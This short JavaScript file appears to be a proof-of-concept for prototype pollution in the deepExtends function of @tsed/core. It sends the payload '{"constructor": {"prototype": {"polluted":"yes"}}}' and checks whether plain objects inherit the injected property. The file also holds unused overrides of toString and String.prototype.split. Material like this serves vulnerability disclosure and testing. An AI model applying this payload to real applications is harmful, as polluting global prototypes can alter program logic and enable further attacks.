var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const {deepExtends} = require('@tsed/core');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
let obj = {};
console.log({}.polluted);
let result = deepExtends({ security: [{ 1: 'o' }] }, payload);
console.log({}.polluted);